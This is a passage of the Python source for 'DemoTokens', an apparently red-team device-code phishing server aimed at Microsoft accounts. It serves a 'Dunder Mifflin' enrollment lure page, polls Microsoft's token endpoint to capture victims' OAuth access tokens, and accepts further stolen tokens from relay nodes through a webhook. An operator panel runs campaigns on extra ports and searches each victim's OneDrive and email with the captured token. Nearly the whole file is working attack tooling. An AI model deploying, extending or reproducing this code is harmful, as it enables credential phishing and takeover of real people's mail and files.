        "      ?(data.from.emailAddress.name||data.from.emailAddress.address||'(unknown)'):'(unknown)';",
        "    document.getElementById('viewerMeta').textContent='From: '+from+'   \u00b7   '",
        "      +(data.receivedDateTime?new Date(data.receivedDateTime).toLocaleString():'');",
        "    var body=data.body||{}; var el=document.getElementById('viewerBody');",
        "    if(body.contentType==='html'){",
        "      el.className='viewer-body html-body';",
        "      var iframe=document.createElement('iframe');",
        "      iframe.sandbox='allow-same-origin';",
        "      iframe.style.cssText='width:100%;min-height:280px;border:none;display:block;';",
        "      iframe.srcdoc=body.content||''; el.innerHTML=''; el.appendChild(iframe);",
        "    } else { el.className='viewer-body'; el.textContent=body.content||''; }",
        "  })",
        "  .catch(e=>{document.getElementById('viewerBody').textContent='Error: '+e.message;});",
        "}",
        "function showViewer(title,meta) {",
        "  document.getElementById('viewerTitle').textContent=title;",
        "  var el=document.getElementById('viewerBody');",
        "  el.className='viewer-body'; el.textContent='Loading\u2026';",
        "  document.getElementById('viewerMeta').textContent=meta||'';",
        "  document.getElementById('viewerOverlay').classList.add('visible');",
        "}",
        "function closeViewer(){document.getElementById('viewerOverlay').classList.remove('visible');}",
        "window.runSearch=runSearch; window.openItem=openItem;",
        "window.openEmail=openEmail; window.closeViewer=closeViewer;",
        "}());",
    ])

    content = (
        "<div class='breadcrumb'><a href='/app/tokens'>\u2190 Tokens</a> / Search</div>"
        "<h2>Search</h2>"
        "<p class='page-sub'>OneDrive and email search for "
        "<span class='upn'>" + _esc(token["upn"]) + "</span></p>"
        "<div class='info-bar'>"
        "<span>&#128100; <span class='upn'>" + _esc(token["upn"]) + "</span></span>"
        "<span>&#128197; " + _esc(token["captured_at"]) + "</span>"
        "<span><span class='badge badge-" + _esc(token["source"]) + "'>"
        + _esc(token["source"]) + "</span></span>"
        "</div>"
        "<div class='card'><div class='card-hdr'>Graph Search</div>"
        "<div class='card-body'>"
        "<div class='search-row'>"
        "<input class='search-input' id='searchInput' type='text' placeholder='Enter keyword\u2026'"
        " onkeydown=\"if(event.key==='Enter')runSearch('onedrive')\"/>"
        "</div>"
        "<div class='search-row'>"
        "<button class='search-btn' onclick=\"runSearch('onedrive')\">&#128193; OneDrive</button>"
        "<button class='search-btn email-btn' onclick=\"runSearch('email')\">&#9993; Email</button>"
        "</div>"
        "<div id='searchResultsPanel' class='results-panel' style='display:none'>"
        "<div id='searchResults'></div></div>"
        "</div></div>"
        "<div class='viewer-overlay' id='viewerOverlay'"
        " onclick=\"if(event.target===this)closeViewer()\">"
        "<div class='viewer-card'>"
        "<div class='viewer-hdr'>"
        "<span class='viewer-title' id='viewerTitle'></span>"
        "<button class='viewer-close' onclick='closeViewer()'>&times;</button>"
        "</div>"
        "<div class='viewer-body' id='viewerBody'></div>"
        "<div class='viewer-meta' id='viewerMeta'></div>"
        "</div></div>"
    )
    return _op_page("Search \u2014 " + token["upn"], "tokens", content, extra_js=js)


# ---------------------------------------------------------------------------
# Response-capture helper
# ---------------------------------------------------------------------------

class _TeeWriter:
    def __init__(self, real, buf):
        self._real = real
        self._buf  = buf

    def write(self, data):
        n = self._real.write(data)
        self._buf.write(data)
        return n

    def flush(self):
        return self._real.flush()

    def __getattr__(self, name):
        return getattr(self._real, name)


# ---------------------------------------------------------------------------
# Request handler
# ---------------------------------------------------------------------------

class Handler(BaseHTTPRequestHandler):

    # ---- logging setup -------------------------------------------------------

    def setup(self):
        super().setup()
        self._log_ts       = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%dT%H%M%S_%f")
        self._req_body     = b""
        self._resp_status  = None
        self._resp_headers = []
        self._resp_body    = io.BytesIO()
        self._real_wfile   = self.wfile
        self.wfile         = _TeeWriter(self._real_wfile, self._resp_body)

    def handle_one_request(self):
        try:
            super().handle_one_request()
        except (BrokenPipeError, ConnectionResetError):
            pass
        finally:
            try:
                self._flush_log()
            except Exception as exc:
                print("[LOG ERROR]", exc)

    def send_response(self, code, message=None):
        self._resp_status = code
        super().send_response(code, message)

    def send_header(self, keyword, value):
        self._resp_headers.append((keyword, str(value)))
        super().send_header(keyword, value)

    def _flush_log(self):
        os.makedirs(LOG_DIR, exist_ok=True)
        path = os.path.join(LOG_DIR, self._log_ts + ".log")
        lines = []
        lines.append("=" * 70)
        lines.append("TIMESTAMP : " + self._log_ts)
        lines.append("CLIENT    : " + self.address_string())
        lines.append("=" * 70)
        lines.append("")

        cmd = getattr(self, "command", None) or "?"
        lines.append(">>> REQUEST")
        lines.append("%s %s %s" % (cmd, self.path, self.request_version))
        for k, v in self.headers.items():
            lines.append("%s: %s" % (k, v))
        if self._req_body:
            lines.append("")
            try:
                text = self._req_body.decode("utf-8", errors="replace")
                try:
                    lines.append(json.dumps(json.loads(text), indent=2))
                except Exception:
                    lines.append(text[:4000])
            except Exception:
                lines.append(repr(self._req_body[:512]))
        lines.append("")

        lines.append("<<< RESPONSE  Status: %s" % self._resp_status)
        raw = self._resp_body.getvalue()
        if raw:
            split      = raw.find(b"\r\n\r\n")
            body_bytes = raw[split + 4:] if split != -1 else raw
            if body_bytes:
                lines.append("")
                try:
                    text = body_bytes.decode("utf-8", errors="replace")
                    try:
                        lines.append(json.dumps(json.loads(text), indent=2))
                    except Exception:
                        lines.append(text[:2000] + ("... [truncated]" if len(text) > 2000 else ""))
                except Exception:
                    lines.append(repr(body_bytes[:512]))

        content = "\n".join(lines) + "\n"
        with _log_lock:
            with open(path, "w", encoding="utf-8") as f:
                f.write(content)

    def log_message(self, fmt, *args):
        print("[%s] %s" % (self.address_string(), fmt % args))

    # ---- response helpers ----------------------------------------------------

    def send_json(self, data, status=200):
        body = json.dumps(data).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def send_html(self, html, status=200):
        body = html.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=UTF-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("X-Frame-Options", "DENY")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def redirect(self, location):
        self.send_response(302)
        self.send_header("Location", location)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def read_body(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length) if length else b""
        self._req_body = body
        return body

    # ---- victim routes -------------------------------------------------------

    def serve_enroll(self):
        """GET / — Dunder Mifflin device-code enrollment page."""
        params = {"client_id": CLIENT_ID, "resource": RESOURCE, "scope": SCOPES}
        status, dc = ms_post(DC_URL, params)
        if status != 200 or "device_code" not in dc:
            self.send_response(502)
            self.end_headers()
            self.wfile.write(b"Failed to obtain device code from Microsoft.")
            return
        html = build_enroll_html(
            dc["device_code"],
            dc.get("user_code", ""),
            dc.get("verification_url", "https://microsoft.com/devicelogin"),
            dc.get("expires_in", 900),
            dc.get("interval", 5),
        )
        self.send_html(html)

    def handle_poll(self):
        """POST /poll — victim browser polls; token stored in DB on success."""
        try:
            body = json.loads(self.read_body())
        except Exception:
            self.send_json({"error": "bad_request"}, 400)
            return

        status, data = ms_post(TOKEN_URL, {
            "client_id":  CLIENT_ID,
            "resource":   RESOURCE,
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "code":       body.get("device_code", ""),
        })

        if status == 200 and data.get("token_type"):
            rec = db.store_token(data, source="poll")
            print("[CAPTURE] poll  token=%s  user=%s" % (rec["id"][:8], rec["upn"]))
            self.send_json({"session_id": rec["id"]})
        else:
            self.send_json(data, status)

    def serve_victim_search(self):
        """GET /search?s=<token_id> — post-auth search page for the victim."""
        qs  = urllib.parse.urlparse(self.path).query
        sid = urllib.parse.parse_qs(qs).get("s", [None])[0]
        if not sid:
            self.redirect("/")
            return
        token = db.get_token(sid)
        if not token:
            self.redirect("/")
            return
        self.send_html(build_search_html(token["access_token"]))

    # ---- operator routes -------------------------------------------------------

    def serve_dashboard(self):
        self.send_html(_dashboard_html())

    def serve_device_codes(self):
        host_hdr = self.headers.get("Host", "")
        hostname = host_hdr.split(":")[0] if host_hdr else ""
        self.send_html(_device_codes_html(hostname))

    def handle_new_campaign(self):
        """POST /app/device-codes/new — create a campaign stub; device code fetched on victim click."""
        raw = self.read_body()
        try:
            params   = urllib.parse.parse_qs(raw.decode("utf-8", errors="replace"))
            port_str = params.get("port", [str(PORT)])[0]
            port     = int(port_str)
            if not (1 <= port <= 65535):
                raise ValueError("port out of range")
        except (ValueError, KeyError):
            port = PORT

        raw_domain = urllib.parse.parse_qs(raw.decode("utf-8", errors="replace")).get("domain", [""])[0].strip()
        if raw_domain and not nginx_helper.is_valid_domain(raw_domain):
            self.send_html(
                "<!DOCTYPE html><html><body"
                " style='background:#0d1117;color:#e6edf3;padding:40px'>"
                "<h2 style='color:#f85149'>Invalid Domain</h2>"
                "<p>Domain <b>" + _esc(raw_domain) + "</b> contains invalid characters. "
                "Use only letters, numbers, hyphens, and dots.</p>"
                "<p><a href='/app/device-codes' style='color:#58a6ff'>&larr; Back</a></p>"
                "</body></html>",
                400,
            )
            return
        domain = raw_domain if raw_domain else None

        if port != PORT:
            if not (PORT <= port <= PORT_MAX):
                self.send_html(
                    "<!DOCTYPE html><html><body"
                    " style='background:#0d1117;color:#e6edf3;padding:40px'>"
                    "<h2 style='color:#f85149'>Port Out of Range</h2>"
                    "<p>Port <b>" + _esc(str(port)) + "</b> is outside the exposed range "
                    "<b>" + str(PORT) + "&ndash;" + str(PORT_MAX) + "</b>. "
                    "Raise <code>PORT_MAX</code> in your environment / docker-compose to allow it.</p>"
                    "<p><a href='/app/device-codes' style='color:#58a6ff'>&larr; Back</a></p>"
                    "</body></html>",
                    400,
                )
                return
            if not _start_campaign_server(port):
                self.send_html(
                    "<!DOCTYPE html><html><body"
                    " style='background:#0d1117;color:#e6edf3;padding:40px'>"
                    "<h2 style='color:#f85149'>Port Bind Error</h2>"
                    "<p>Could not bind to port <b>" + _esc(str(port)) + "</b>. "
                    "It may already be in use by another process.</p>"
                    "<p><a href='/app/device-codes' style='color:#58a6ff'>&larr; Back</a></p>"
                    "</body></html>",
                    500,
                )
                return

        dc_id = db.create_campaign_stub(port=port, domain=domain)
        print("[CAMPAIGN] Stub created  dc_id=%s  port=%d  domain=%s" % (dc_id[:8], port, domain or ""))
        nginx_helper.sync()
        self.redirect("/app/device-codes")

    def serve_tokens(self):
        self.send_html(_tokens_html())

    def serve_nodes(self):
        self.send_html(_nodes_html())

    def serve_op_search(self):
        """GET /app/search?id=<token_id> — operator search page."""
        qs  = urllib.parse.urlparse(self.path).query
        tid = urllib.parse.parse_qs(qs).get("id", [None])[0]
        if not tid:
            self.redirect("/app/tokens")
            return
        html = _search_page_html(tid)
        if not html:
            self.send_html(
                "<!DOCTYPE html><html><body style='background:#0d1117;color:#e6edf3;padding:40px'>"
                "<h2>Token not found.</h2><p><a href='/app/tokens' style='color:#58a6ff'>Back</a></p>"
                "</body></html>",
                404,
            )
            return
        self.send_html(html)

    # ---- campaign victim routes ----------------------------------------

    def serve_campaign_landing(self, dc_id):
        """GET /c/<id> — victim landing page; device code fetched only when victim clicks."""
        rec = db.get_device_code(dc_id)
        if not rec:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")
            return
        if rec["status"] == "pending" and rec["device_code"]:
            # Already activated (e.g. victim refreshed) — re-serve enroll page with existing code
            html = build_enroll_html(
                rec["device_code"], rec["user_code"],
                rec["verification_url"], rec["expires_in"], rec["interval"],
            )
        else:
            html = build_landing_html(dc_id)
        self.send_html(html)

    def handle_campaign_start(self, dc_id):
        """POST /c/<id>/start — fetch device code from MS and activate campaign."""
        rec = db.get_device_code(dc_id)
        if not rec:
            self.send_json({"error": "not_found"}, 404)
            return
        # Already activated — return existing code (idempotent)
        if rec["status"] == "pending" and rec["device_code"]:
            self.send_json({
                "device_code":      rec["device_code"],
                "user_code":        rec["user_code"],
                "verification_url": rec["verification_url"],
                "expires_in":       rec["expires_in"],
                "interval":         rec["interval"],
            })
            return
        # Fetch fresh code from Microsoft
        params = {"client_id": CLIENT_ID, "resource": RESOURCE, "scope": SCOPES}
        status, dc = ms_post(DC_URL, params)
        if status != 200 or "device_code" not in dc:
            self.send_json({"error": "ms_error", "error_description": "Failed to obtain device code from Microsoft."}, 502)
            return
        db.activate_campaign(dc_id, dc)
        _poller.start(dc_id, dc["device_code"], dc.get("interval", 5), dc.get("expires_in", 900))
        print("[CAMPAIGN] Activated  dc_id=%s  user_code=%s" % (dc_id[:8], dc.get("user_code")))
        self.send_json({
            "device_code":      dc["device_code"],
            "user_code":        dc.get("user_code", ""),
            "verification_url": dc.get("verification_url", "https://microsoft.com/devicelogin"),
            "expires_in":       dc.get("expires_in", 900),
            "interval":         dc.get("interval", 5),
        })

    # ---- relay check-in ------------------------------------------------

    def handle_relay_checkin(self):
        """POST /relay/checkin — relay node registers with the panel."""
        if not RELAY_SECRET:
            self.send_json({"error": "relay_not_configured",
                            "message": "RELAY_SECRET not set on this server."}, 503)
            return
        sent = self.headers.get("X-Relay-Secret", "")
        if not hmac.compare_digest(sent, RELAY_SECRET):
            self.send_json({"error": "unauthorized"}, 401)
            return
        try:
            body = json.loads(self.read_body()) if self.headers.get("Content-Length", "0") != "0" else {}
        except Exception:
            body = {}
        client_ip = self.address_string()
        label     = str(body.get("label", ""))[:64]
        node_id   = db.register_node(label, client_ip)
        print("[RELAY] Checkin  node=%s  ip=%s  label=%s" % (node_id[:8], client_ip, label or "(none)"))
        self.send_json({"ok": True, "node_id": node_id})

    # ---- webhook -------------------------------------------------------

    def handle_webhook(self):
        """POST /webhook — ingest token from an authenticated relay node."""
        if RELAY_SECRET:
            sent_secret  = self.headers.get("X-Relay-Secret", "")
            if not hmac.compare_digest(sent_secret, RELAY_SECRET):
                self.send_json({"error": "unauthorized"}, 401)
                return
            node_id = self.headers.get("X-Node-Id", "")
            if not node_id or not db.get_node(node_id):
                self.send_json({"error": "node_not_registered",
                                "message": "POST /relay/checkin first."}, 403)
                return
            db.touch_node(node_id, self.address_string())
        try:
            body = json.loads(self.read_body())
        except Exception:
            self.send_json({"error": "bad_request"}, 400)
            return
        if not body.get("access_token"):
            self.send_json({"error": "missing access_token"}, 400)
            return
        rec = db.store_token(body, source="webhook")
        print("[CAPTURE] webhook  token=%s  user=%s" % (rec["id"][:8], rec["upn"]))
        self.send_json({
            "ok":         True,
            "token_id":   rec["id"],
            "upn":        rec["upn"],
            "search_url": "/app/search?id=" + rec["id"],
        })

    def handle_delete_node(self):
        """POST /app/nodes/delete — remove a relay node record."""
        try:
            body = json.loads(self.read_body())
        except Exception:
            self.send_json({"error": "bad_request"}, 400)
            return
        nid = body.get("id", "")
        if not nid:
            self.send_json({"error": "missing id"}, 400)
            return
        db.delete_node(nid)
        self.send_json({"ok": True})

    def handle_delete_token(self):
        """POST /app/tokens/delete — delete a single token."""
        try:
            body = json.loads(self.read_body())
        except Exception:
            self.send_json({"error": "bad_request"}, 400)
            return
        tid = body.get("id", "")
        if not tid:
            self.send_json({"error": "missing id"}, 400)
            return
        db.delete_token(tid)
        self.send_json({"ok": True})

    def handle_clear_tokens(self):
        """POST /app/tokens/clear — delete all tokens."""
        self.read_body()
        db.clear_tokens()
        self.send_json({"ok": True})

    def handle_delete_campaign(self):
        """POST /app/device-codes/delete — delete a single campaign."""
        try:
            body = json.loads(self.read_body())
        except Exception:
            self.send_json({"error": "bad_request"}, 400)
            return
        dc_id = body.get("id", "")
        if not dc_id:
            self.send_json({"error": "missing id"}, 400)
            return
        db.delete_device_code(dc_id)
        nginx_helper.sync()
        self.send_json({"ok": True})

    def handle_clear_campaigns(self):
        """POST /app/device-codes/clear — delete all campaigns."""
        self.read_body()
        db.clear_device_codes()
        nginx_helper.sync()
        self.send_json({"ok": True})

    # ---- router -------------------------------------------------------

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if   path == "/":                   self.serve_enroll()
        elif path == "/search":             self.serve_victim_search()
        elif path == "/app":                self.serve_dashboard()
        elif path == "/app/device-codes":   self.serve_device_codes()
        elif path == "/app/tokens":         self.serve_tokens()
        elif path == "/app/search":         self.serve_op_search()
        elif path == "/app/nodes":          self.serve_nodes()
        elif path.startswith("/c/"):        self.serve_campaign_landing(path[3:])
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        if   path == "/poll":                       self.handle_poll()
        elif path == "/app/device-codes/new":       self.handle_new_campaign()
        elif path == "/app/device-codes/delete":    self.handle_delete_campaign()
        elif path == "/app/device-codes/clear":     self.handle_clear_campaigns()
        elif path == "/app/tokens/delete":          self.handle_delete_token()
        elif path == "/app/tokens/clear":           self.handle_clear_tokens()
        elif path == "/relay/checkin":               self.handle_relay_checkin()
        elif path == "/webhook":                    self.handle_webhook()
        elif path == "/app/nodes/delete":           self.handle_delete_node()
        elif path.startswith("/c/") and path.endswith("/start"):
            self.handle_campaign_start(path[3:-6])
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")


# ---------------------------------------------------------------------------
# Per-campaign port listeners
# ---------------------------------------------------------------------------

_extra_servers      = {}
_extra_servers_lock = threading.Lock()


class VictimHandler(Handler):
    """Victim-only handler for per-campaign ports (no operator UI exposed)."""

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path.startswith("/c/"):
            self.serve_campaign_landing(path[3:])
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        if path.startswith("/c/") and path.endswith("/start"):
            self.handle_campaign_start(path[3:-6])
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")


def _start_campaign_server(port):
    """Start a victim-only HTTP listener on *port* in a daemon thread.

    Returns True if the server is running (already was or just started),
    False if the port could not be bound.
    """
    with _extra_servers_lock:
        if port in _extra_servers or port == PORT:
            return True
        try:
            srv = HTTPServer(("", port), VictimHandler)
        except OSError as exc:
            print("[SERVER] Failed to bind port %d: %s" % (port, exc))
            return False
        t = threading.Thread(
            target=srv.serve_forever,
            daemon=True,
            name="victim-%d" % port,
        )
        t.start()
        _extra_servers[port] = srv
        print("[SERVER] Victim listener started on port %d" % port)
        return True


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    db.init_db()
    # Restore per-campaign port listeners for campaigns that survived a restart
    for _dc in db.list_device_codes():
        _p = _dc.get("port")
        if _p and int(_p) != PORT:
            _start_campaign_server(int(_p))
    # Re-sync nginx config for any domain campaigns that survived a restart
    nginx_helper.sync()
    server = HTTPServer(("", PORT), Handler)
    print("DemoTokens running at http://localhost:" + str(PORT))
    print("  Victim page  : http://localhost:" + str(PORT) + "/")
    print("  Operator UI  : http://localhost:" + str(PORT) + "/app")
    print("  Device Codes : http://localhost:" + str(PORT) + "/app/device-codes")
    print("  Tokens       : http://localhost:" + str(PORT) + "/app/tokens")
    print("  Webhook IN   : POST http://localhost:" + str(PORT) + "/webhook")
    if RELAY_SECRET:
        print("  Relay auth   : X-Relay-Secret header required on /webhook")
    else:
        print("  Relay auth   : RELAY_SECRET not set — /webhook is UNAUTHENTICATED")
    print("Press Ctrl+C to stop.")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nStopped.")

